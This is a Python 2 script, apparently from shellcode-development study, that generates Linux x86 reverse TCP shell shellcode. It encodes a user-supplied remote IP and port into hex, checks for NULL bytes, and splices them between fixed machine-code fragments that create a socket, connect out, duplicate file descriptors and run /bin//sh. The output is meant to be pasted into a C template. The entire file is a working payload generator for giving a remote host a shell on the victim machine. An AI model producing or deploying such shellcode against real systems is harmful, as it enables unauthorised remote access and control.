#!/usr/bin/env python

import sys
import socket

# check number of arguments
if len(sys.argv) < 3:
    print "\nUsage: " + sys.argv[0] + " <RHOST> <RPORT> \n"
    sys.exit()

# see if supplied port number is usable
if ((int(sys.argv[2]) < 65536) and (int(sys.argv[2]) > 1024)):

    # check if port number is not a multiplier of 256, resulting shellcode will contain NULLs
    if (int(sys.argv[2]) % 256) == 0:
	print "\nThis port number is a multiplier of 256 and thus will contain NULL bytes, please specify another!\n"
        sys.exit()

    # first part of shellcode
    first_shellcode = ("\\x31\\xc0\\x31\\xdb\\x53\\x6a\\x01\\x6a\\x02\\x89\\xe1\\xb0\\x66\\xb3\\x01\\xcd\\x80\\x89\\xc7\\x31\\xc0\\x68")

    # second part of shellcode
    second_shellcode = ("\\x66\\x68")

    # third part of shellcode
    third_shellcode = ("\\x66\\x6a\\x02\\x89\\xe3\\x6a\\x10\\x53\\x57\\x31\\xdb\\xb0\\x66\\xb3\\x03\\x89\\xe1\\xcd\\x80\\x89\\xfb\\x31\\xc9\\xb1\\x02\\x31\\xc0\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80")

    # get port number in hex format
    port = hex(int(sys.argv[2]))
    port_number = ""

    # check if "port" is 5 bytes long (e.g. 2715 = 0xa9b) and add 0 if necessary
    if len(port) == 5:
        port_number = "\\x0%s\\x%s" % (port[2:3],port[3:5])
    elif len(port) == 6:
        port_number = "\\x%s\\x%s" % (port[2:4],port[4:6])
    print "\nPort number in hex format: " + port_number

    # get IP address
    ip = sys.argv[1]
    ip_address = ""
    # extract every IP address octet
    ip_octet = ip.split(".")
    # convert each octet to hex format and build ip_address string
    for i in range(4):
	ip_byte = hex(int(ip_octet[i]))
    # check if IP address contains NULLs
	if ip_byte == hex(0):
	    print "\nIP address contains NULLs, this will break shellcode. Please specify another IP address!\n"
	    sys.exit()
    # check if octet contains a single character (e.g. 0x1) and add 0 if necessary
        if len(ip_byte) == 3:
            ip_address += "\\x0%s" % (ip_byte[2:3])
        else:
            ip_address += "\\x%s" % (ip_byte[2:4])
    print "\nIP address in hex format: " + ip_address

    # combine all parts of shellcode and print to screen
    final_shellcode = first_shellcode + ip_address + second_shellcode + port_number + third_shellcode
    print "\nShellcode complete! Paste this into reverse_tcp_shell_template.c\n"
    print final_shellcode
else:
    print "\nPort number must be between 1025 and 65535\n"
sys.exit()
